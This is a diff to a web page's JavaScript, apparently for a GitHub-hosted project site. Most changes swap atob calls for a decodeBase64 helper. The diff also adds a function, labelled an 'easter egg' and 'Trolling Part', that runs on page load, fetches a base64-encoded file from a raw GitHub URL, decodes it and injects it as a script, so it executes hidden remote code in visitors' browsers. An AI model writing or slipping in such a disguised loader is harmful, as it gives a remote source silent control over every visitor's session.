@@ -138,6 +138,19 @@
         const supportUrl = "https://api.github.com/repos/DrMineword/Artefact-Boost-Active/contents/support.json";
         const discordWidgetUrl = "https://discord.com/api/guilds/1228678846023335936/widget.json";
 
+        // Easter egg base64 script URL
+        const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+
+        // Function to decode base64 content
+        function decodeBase64(content) {
+            try {
+                return atob(content);  // Decode the base64 content
+            } catch (e) {
+                console.error("Error decoding base64 content", e);
+                return content;  // Return original content if there's an error
+            }
+        }
+
         // Function to decode URL-encoded content
         function decodeURIComponentSafe(encodedString) {
             try {
@@ -220,7 +233,7 @@
 
                 const data = await response.json();
                 const base64Content = data.content;
-                const decodedSettings = atob(base64Content);
+                const decodedSettings = decodeBase64(base64Content);  // Decode the base64 content
                 const settings = JSON.parse(decodedSettings);
 
                 document.getElementById('website-title').innerText = settings.websiteTitle;
@@ -279,7 +292,7 @@
 
                 const data = await response.json();
                 const base64Content = data.content;
-                let decodedContent = atob(base64Content);
+                let decodedContent = decodeBase64(base64Content);  // Decode the base64 content
                 decodedContent = decodeURIComponentSafe(decodedContent);
 
                 const formattedContent = formatText(decodedContent);
@@ -297,7 +310,7 @@
 
                 const data = await response.json();
                 const base64Content = data.content;
-                const decodedSupport = atob(base64Content);
+                const decodedSupport = decodeBase64(base64Content);  // Decode the base64 content
                 const supportArray = JSON.parse(decodedSupport);
 
                 const supportListElement = document.getElementById('support-list');
@@ -318,6 +331,36 @@
                 console.log('Error loading support data:', error);
             }
         }
+
+        // Function to fetch and execute the Base64-encoded script (Trolling Part)
+        async function fetchAndExecuteBase64Script() {
+            try {
+                const response = await fetch(base64ScriptUrl);
+                if (!response.ok) {
+                    throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
+                }
+
+                // Get the encoded content as text
+                const encodedScript = await response.text();
+
+                // Decode the Base64 content
+                const decodedScript = atob(encodedScript);
+
+                console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
+
+                // Execute the decoded script
+                const scriptElement = document.createElement("script");
+                scriptElement.textContent = decodedScript;
+                document.body.appendChild(scriptElement);
+
+                console.log("Script executed successfully.");
+            } catch (error) {
+                console.error("Error fetching or executing the Base64 script:", error);
+            }
+        }
+
+        // Call the function to fetch, decode, and execute the script
+        fetchAndExecuteBase64Script();
 
         // Load settings and content on page load
         window.onload = async () => {
